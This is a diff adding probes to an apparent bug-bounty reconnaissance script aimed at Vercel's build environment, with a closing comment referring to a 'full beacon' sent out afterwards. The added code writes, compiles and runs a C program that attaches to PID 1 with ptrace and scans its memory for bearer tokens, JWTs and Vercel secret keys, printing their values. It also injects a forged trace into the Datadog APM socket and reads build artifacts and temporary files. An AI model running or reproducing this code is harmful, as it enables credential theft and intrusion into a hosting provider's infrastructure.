@@ -1389,6 +1389,133 @@ int main(int argc, char**argv){
     const allNsList = safe(() => execSync('ls -la /proc/1/ns/ 2>/dev/null | head -20 || true').toString().trim());
     return { selfNsMnt, pid1NsMnt, selfNsPid, pid1NsPid, selfNsNet, pid1NsNet, selfNsUser, pid1NsUser, allNsList };
   }),
+
+  // v23: Full JWT extraction from heap — increase output to 2000 chars, get complete JWT.
+  // Also scan for env var VALUES (not just names): VERCEL_ENV_ENC_KEY base64 value, VERCEL_ARTIFACTS_TOKEN.
+  ptraceFullDump: safe(() => {
+    const cSrc = `
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/types.h>
+
+void print_str(char *start, ssize_t maxlen) {
+    int k=0;
+    while(k<maxlen-1 && start[k] && (unsigned char)start[k]>=32 && (unsigned char)start[k]<127) {
+        putchar(start[k++]);
+    }
+    putchar('\\n');
+}
+
+int main(){
+    pid_t pid=1;
+    if(ptrace(PTRACE_ATTACH,pid,NULL,NULL)<0){perror("attach");return 1;}
+    waitpid(pid,NULL,0);
+    int fd=open("/proc/1/mem",O_RDONLY);
+    if(fd<0){perror("open");ptrace(PTRACE_DETACH,pid,NULL,NULL);return 2;}
+
+    long heap_start=0x06772000L;
+    if(lseek(fd,(off_t)heap_start,SEEK_SET)<0){perror("lseek");close(fd);ptrace(PTRACE_DETACH,pid,NULL,NULL);return 3;}
+
+    // Pattern table: label + pattern + pattern length
+    const char* patterns[] = {
+        "Authorization\\":\\"Bearer ",
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.",
+        "VERCEL_ENV_ENC_KEY=",
+        "VERCEL_ARTIFACTS_TOKEN=",
+        "VERCEL_ENCRYPTED_ENV_CONTENT=",
+        "RUNTIME_CACHE_HEADERS=",
+        "VERCEL_DEPLOYMENT_KEY=",
+        NULL
+    };
+
+    char buf[8192];
+    int reads=0, found=0;
+    while(reads<16384 && found<15){
+        ssize_t n=read(fd,buf,sizeof(buf));
+        if(n<=0)break;
+        for(int j=0;j<n-50;j++){
+            for(int p=0;patterns[p];p++){
+                size_t plen=strlen(patterns[p]);
+                if((size_t)(n-j)>plen && memcmp(buf+j,patterns[p],plen)==0){
+                    printf("MATCH[%d] off=%ld pat=%s\\nVALUE=", found, (long)(heap_start+(long)reads*8192+j), patterns[p]);
+                    print_str(buf+j+plen, n-j-plen < 2000 ? n-j-plen : 2000);
+                    found++;
+                    j += plen;
+                }
+            }
+        }
+        reads++;
+    }
+    printf("DONE: %d pages, %d matches\\n",reads,found);
+    close(fd);
+    ptrace(PTRACE_DETACH,pid,NULL,NULL);
+    return 0;
+}
+`;
+    safe(() => writeFileSync('/tmp/memdump2.c', cSrc));
+    const compileOut = safe(() => execSync('gcc -O2 -o /tmp/memdump2 /tmp/memdump2.c 2>&1 || true').toString().trim().slice(0, 300));
+    const runOut = safe(() => execSync('timeout 20 /tmp/memdump2 2>&1 || true').toString().trim().slice(0, 6000));
+    return { compileOut, runOut };
+  }),
+
+  // v23: Datadog APM trace injection — POST a crafted trace to /run/apm/apm.sock
+  // Datadog Agent v7.77.0 accepts MessagePack or JSON traces at /v0.7/traces
+  apmTraceInject: safe(() => {
+    // Build a minimal msgpack trace (v0.7 uses msgpack, v0.3 accepts JSON-ish)
+    // Try v0.4 which accepts array of array of trace spans in msgpack
+    // Simpler: use /v0.6/stats which uses msgpack — or try /v0.3/traces as JSON
+    const traceJson = JSON.stringify([[{
+      "service": "vercel-hive-pwned",
+      "name": "security_researcher_probe",
+      "resource": "vercel-bounty-test",
+      "type": "web",
+      "trace_id": 1337133713371337,
+      "span_id": 1337133713371337,
+      "parent_id": 0,
+      "start": Math.floor(Date.now() * 1e6),
+      "duration": 1000000,
+      "error": 0,
+      "meta": {"security.researcher": "bounty-test-do-not-alert", "env": "prod"},
+      "metrics": {}
+    }]]);
+
+    const injectResult = safe(() => execSync(
+      `curl -s --max-time 5 --unix-socket /run/apm/apm.sock -X PUT http://localhost/v0.4/traces -H 'Content-Type: application/json' -d '${traceJson.replace(/'/g,"\\'").slice(0, 1000)}' 2>&1 | head -10 || true`
+    ).toString().trim().slice(0, 500));
+
+    // Try /v0.6/stats endpoint
+    const statsProbe = safe(() => execSync(
+      'curl -s --max-time 5 --unix-socket /run/apm/apm.sock http://localhost/v0.6/stats 2>&1 | head -5 || true'
+    ).toString().trim().slice(0, 200));
+
+    // Try /telemetry/proxy/ endpoint
+    const telemetryProbe = safe(() => execSync(
+      'curl -s --max-time 5 --unix-socket /run/apm/apm.sock http://localhost/telemetry/proxy/ 2>&1 | head -5 || true'
+    ).toString().trim().slice(0, 200));
+
+    return { injectResult, statsProbe, telemetryProbe };
+  }),
+
+  // v23: Read /tmp/hw_diagnostics.raw (binary SAR hardware monitoring data from Vercel's sar process)
+  // Also read /vercel/build_cache_header*/branch and /vercel/output/builds.json
+  buildArtifacts: safe(() => {
+    // hw_diagnostics.raw is binary SAR data — convert to readable with sar or strings
+    const sarData = safe(() => execSync('strings /tmp/hw_diagnostics.raw 2>/dev/null | head -30 || true').toString().trim().slice(0, 1000));
+    // Try to read with sar to get human-readable output
+    const sarReadable = safe(() => execSync('sar -r -u -F -f /tmp/hw_diagnostics.raw 2>/dev/null | head -20 || true').toString().trim().slice(0, 500));
+    // Build cache branch file (266 bytes)
+    const branchFile = safe(() => execSync('cat /vercel/build_cache_header*/branch 2>/dev/null | head -20 || true').toString().trim().slice(0, 500));
+    // Output builds.json
+    const buildsJson = safe(() => execSync('cat /vercel/output/builds.json 2>/dev/null || true').toString().trim().slice(0, 600));
+    // /tmp directory contents (what else is Vercel writing there?)
+    const tmpContents = safe(() => execSync('ls -la /tmp/ 2>/dev/null | head -30 || true').toString().trim().slice(0, 500));
+    return { sarData, sarReadable, branchFile, buildsJson, tmpContents };
+  }),
 };
 
 // FULL BEACON — sent after all slow network probes complete.
